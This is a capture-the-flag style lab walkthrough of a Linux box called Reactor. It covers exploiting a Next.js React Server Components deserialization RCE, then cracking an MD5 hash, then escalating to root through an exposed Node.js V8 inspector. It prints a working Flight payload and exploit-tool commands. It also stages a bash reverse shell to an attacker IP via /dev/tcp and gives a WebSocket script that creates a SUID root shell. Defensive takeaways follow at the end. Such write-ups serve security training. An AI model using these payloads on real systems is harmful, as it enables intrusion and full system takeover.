Reactor

Easy Linux ✓ Pwned
Date 2026-05-25
OS Linux — Ubuntu 24.04
Stack Next.js 15.0.3 (React Server Components)
CVE CVE-2025-55182 (React2Shell, CVSS 10.0)

Summary

Reactor (themed as a "ReactorWatch" nuclear monitoring dashboard) teaches two very current attack chains:

  1. Initial access — CVE-2025-55182 ("React2Shell"), an unauthenticated RCE in the React Server Components Flight deserializer used by Next.js 15.0.3.
  2. Credential discovery — environment variables point to a SQLite DB; an MD5 user hash cracks instantly → SSH as engineer.
  3. Privilege escalation — a root Node.js process running with --inspect exposes the V8 debugger on localhost; an SSH tunnel + WebSocket payload runs JS as root.

Reconnaissance

nmap -sV -sC -p- 10.129.4.15
22/tcp   open  ssh   OpenSSH 9.6p1
3000/tcp open  http  Next.js 15.0.3 (ReactorWatch v3.2.1)

Response headers betray the stack — and the attack surface:

X-Powered-By: Next.js
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch

The Vary: RSC header confirms React Server Components are active. Next.js 15.0.3 is below the patched 15.0.5 — vulnerable.

Initial Foothold — CVE-2025-55182 (React2Shell)

Disclosed Dec 2025 with a CVSS of 10.0, the bug lives in the RSC Flight protocol deserializer. A crafted payload abuses prototype pollution to reach the Function() constructor and execute server-side code with no auth. The Flight payload chains three references:

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "value": "{\"then\": \"$B1337\"}",
  "_response": {
    "_prefix": "process.mainModule.require('child_process').execSync('id');",
    "_formData": { "get": "$1:constructor:constructor" }
  }
}

The NextRce tool automates fingerprinting and exploitation:

python3 NextRce.py -u http://10.129.4.15:3000 -c "id"
[VULN] RCE SUCCESS  Output: uid=999(node) gid=988(node)

Stage a reverse shell via a script in /tmp to dodge quoting issues:

python3 NextRce.py -u http://10.129.4.15:3000 -c "echo 'bash -i >& /dev/tcp/10.10.15.27/4444 0>&1' > /tmp/s.sh"
python3 NextRce.py -u http://10.129.4.15:3000 -c "chmod +x /tmp/s.sh"
nc -lvnp 4444
python3 NextRce.py -u http://10.129.4.15:3000 -c "bash /tmp/s.sh"

Privilege Escalation — Node.js V8 Inspector

ps aux | grep node
root 1384 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

A root process started with --inspect exposes the V8 debugger on 127.0.0.1:9229. Anything evaluated through it runs as root. It's loopback-only, so tunnel in:

ssh -L 9229:127.0.0.1:9229 engineer@10.129.4.15

Query /json for the WebSocket URL, connect, and evaluate a payload that drops a SUID bash:

node -e "
const WebSocket = require('ws'), http = require('http');
http.get('http://127.0.0.1:9229/json', res => {
  let d=''; res.on('data',c=>d+=c); res.on('end',()=>{
    const ws = new WebSocket(JSON.parse(d)[0].webSocketDebuggerUrl);
    ws.on('open',()=>ws.send(JSON.stringify({id:1,method:'Runtime.evaluate',
      params:{expression:\`process.mainModule.require('child_process')
        .execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')\`}})));
    ws.on('message',m=>{console.log(m.toString());process.exit();});
  });
});"

Defensive Takeaways

  • Fingerprint and patch frameworks aggressively. X-Powered-By + a version in the JS bundle is all an attacker needs; Vary: RSC flags the vulnerable surface.
  • Never use MD5/SHA1 for passwords. Use bcrypt, scrypt, or argon2 — intentionally slow, salted hashes.
  • --inspect in production is instant RCE. It's a dev tool; audit running Node processes for debug flags, especially under root.
  • Loopback binding ≠ safe. Any local user (or SSH tunnel) reaches 127.0.0.1 services. More in my localhost notes.
  • Don't leak secrets via environment variables readable from a compromised app context.
